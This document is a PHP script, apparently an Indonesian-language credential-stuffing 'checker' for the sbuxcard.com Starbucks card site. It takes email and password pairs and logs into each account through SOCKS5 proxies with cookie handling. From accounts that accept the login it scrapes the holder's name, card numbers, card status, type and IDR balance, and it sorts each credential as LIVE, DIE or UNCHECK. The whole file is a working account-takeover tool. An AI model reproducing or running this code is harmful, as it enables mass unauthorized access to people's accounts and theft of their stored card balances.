<?php
//error_reporting(0);
set_time_limit(0);

    $user_agent     = array(
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5,
Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11,
Opera/9.25 (Windows NT 5.1; U; en),
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727),
Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu),
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12,
Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:50,
Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+2011-10-16 20:21:10,
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0,
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6'
);

$dir = dirname(__FILE__);
        $config['cookie_file'] = $dir . '/_cook/'. md5(rand(100000,999999)) .rand(100000,999999).'.txt';
        if(!file_exists($config['cookie_file'])){
        $fp = @fopen($config['cookie_file'],'w');
        @fclose($fp);
        }

function curl($url, $socks="", $post="", $referer="") { 
    global $config;
    global $user_agent;
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($post) {
    curl_setopt($ch, CURLOPT_POST, true); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    if ($referer) {
    curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    if ($socks) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $socks);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded','Host: www.sbuxcard.com','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Referer: https://www.sbuxcard.com/index.php?page=signin'));
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,7);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_COOKIEFILE,$config['cookie_file']); 
    curl_setopt($ch, CURLOPT_COOKIEJAR,$config['cookie_file']); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 3);
    
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function getStr($string,$start,$end){
    $str = explode($start,$string,2);
    $str = explode($end,$str[1],2);
    return $str[0];
}


function ccv($email,$pwd){
    list($email, $pwd) = explode('|', $_REQUEST['mailpass']);
            // Get Url Login
            $url    = 'https://www.sbuxcard.com/index.php?page=signin';
            $create = curl($url, "", $config['cookie_file']);

            // Get Token
            $token = getStr($create, '<input type="hidden" name="token" value="','"/>');

            // Get Post Value
            $post_value = 'token='.$token.'&Email='.$email.'&Password='.$pwd.'&txtaction=signin';
            $create     = curl($url, "", $post_value, $config['cookie_file']);
                    if (stristr($create, "Welcome back,")) {
            // Get Url Data
            $url    = 'https://www.sbuxcard.com/index.php?page=account';
            $create = curl($url, "", $config['cookie_file']);
                    // Get Cards
                    if (stristr($create, "No payment method registered.")) {
                        $card    = "<font color=red>[ No Card ]</font>"; }
                    else {
                        $card    = "<font color=blue>[ Have Card ]</font>"; }

                    // Get Fullname
                    $ceknama = getStr($create, '<h2 class="headerpromotion">Welcome <font color="#2A8A15">','&nbsp;<font size="-1">');
                    $nama    = "Nama : <font color=fuchsia>$ceknama</font>";

            // Get Url Starbucks Card
            $url    = 'https://www.sbuxcard.com/index.php?page=cards';
            $create = curl($url, "", $config['cookie_file']);
                    // Total Card Tersedia
                    $cektotal   = getStr($create, '<h2 class="mc-title">My Card(s) | Total: ',' cards</h2>');
                    if ($cektotal == null) {
                    $total      = "My Card(s) Total : <font color=red>[ TimeOut ]</font>";
                    } else {
                    $total      = "My Card(s) Total : <font color=lime>$cektotal Cards</font>";
                    }

            // Get Url Buat Token Nya Aja sih!
            $url    = 'https://www.sbuxcard.com/index.php?page=cards';
            $create = curl($url, "", $config['cookie_file']);
            // Get Token Ajax & Data
            $cekajax  = getStr($create, '"<script type="text/javascript">
                $(window).load(function(){
                        event.stopPropagation();
                        $.ajax({
                            url     : "ajaxController.php",
                            data    : "ajax=','&data='.$cekdata.'",
                            cache   : false,
                            success : function(msg){
                                $("#preloader").css({"display":"none"});
                                $("#card_info").fadeIn("Slow");
                                $("#card_info").html(msg);
                            }
                        });
                });
            </script>"');
            // Get Token Data
            $cekdata  = getStr($create, '<div id="card_list_container">
         <div id="card_box">
                <div id="card_box_container">
                                    <div id="','" class="card-list active-card">');

            // Get Url Active Card or Expired Card & Balance
            $url    = 'https://www.sbuxcard.com/ajaxController.php?ajax='.$cekajax.'&data='.$cekdata.'';
            $create = curl($url, "", $config['cookie_file']);

                    // Number Starbucks Card
                    $cek_sbuxcard   = getStr($create, '<tr><td width="100"><strong>Card Number</strong></td><td>: ','</td></tr>');
                    $cek_cardstatus = getStr($create, '<tr>
                                    <td><strong>Card Status</strong></td>
                                    <td>:
                                        <font color="#009933">','</font>                                    </td>
                                </tr>');
                    $cek_type       = getStr($create, '<tr>
                                    <td><strong>Type</strong></td>
                                    <td>:
                                        ','                                    </td>
                                </tr');
                    $cek_balance    = getStr($create, '<tr><td><strong>Balance</strong><br />(IDR)</td>

                                    <td>:
                            <span id="cbal">
                                <font color="#009933">','</font>                         </span></td>

                                </tr>');
                    // Check Balance
                    if ($cek_balance == null) {
                        $balance = "Balance (IDR) : <font color=red>[ TimeOut ]</font>";
                    } else {
                        $balance = "Balance (IDR) : <font color=limegreen>$cek_balance</font>";
                    }
                    // Hasil pengecekan
                    $sbuxcard       = "<font color=aqua>[ $cek_sbuxcard</font>";
                    $cardstatus     = "<font color=lime>- $cek_cardstatus</font>";
                    $type           = "<font color=aqua>- $cek_type ]</font>";

                    $info = "<font style=\"color:white;\">$nama | $balance | $sbuxcard $cardstatus $type | $card | $total | [ACC:sbuxcard.com]</font>";
                }
                    elseif(stristr($create, "Invalid USER ID or Password")){
                    $info = "Die";
                }   else {
                    $info = "Unknown";
                } 
    return $info;
}
function xflush()
{
    static $output_handler = null;
    if ($output_handler === null)
    {
        $output_handler = @ini_get('output_handler');
    }

    if ($output_handler == 'ob_gzhandler')
    {
        // forcing a flush with this is very bad
        return;
    }

    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false)
    {
        @ob_flush();
    }
    else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE)
    {
        @ob_end_flush();
        @ob_start();
    }
}
function delete_cookies()
{
    global $config;
    $f = fopen($config['cookie_file'], 'w');
    fwrite($f, '');
    fclose($f);
}
function getCookies($str){
    preg_match_all('/Set-Cookie: ([^; ]+)(;| )/si', $str, $matches);
    $cookies = implode(";", $matches[1]);
    return $cookies;
}

if ($_REQUEST['do'] == 'check')
{   

    delete_cookies();
    $result = array();
    $delim = $_REQUEST['delim'];
    list($email, $pwd) = explode($delim, $_REQUEST['mailpass']);
    if ((!$email)or(!$pwd))
    {
        $result['error'] = 2;
        $result['msg'] = urldecode($_REQUEST['mailpass']);
        echo json_encode($result);
        exit;
    }

    
        $info['akun'] = ccv($email,$pwd);
        if($info['akun'] == "Die"){
            $result['error'] = 2;
            $result['msg'] = '<b style="color:red">DIE</b> | ' .$email . ' | ' . $pwd;
            delete_cookies();
            echo json_encode($result);
            exit;
            }elseif($info['akun'] == "Unknown"){
        $result['error'] = 1;
        $result['msg'] = '<b style="color:gold">UNCHECK</b> | ' .$email . ' | ' . $pwd;
        delete_cookies();
        echo json_encode($result);
        exit;
        }else{
            $result['error'] = 0;
            $now = '<font color=gold>Check in</font> <font color=red>'.$_SERVER['HTTP_HOST'].'</font> <font color=limegreen>at</font> <font color=red>'.date("g:i a - F j, Y").'</font>';
            $result['msg'] = '<font color=deeppink><b>LIVE</b></font> => <font class="char">' . $email . ' | ' . $pwd . ' | ' . implode(' | ', $info) .' '.$now;
            delete_cookies();
            echo json_encode($result);
            exit;
    }
}   
?>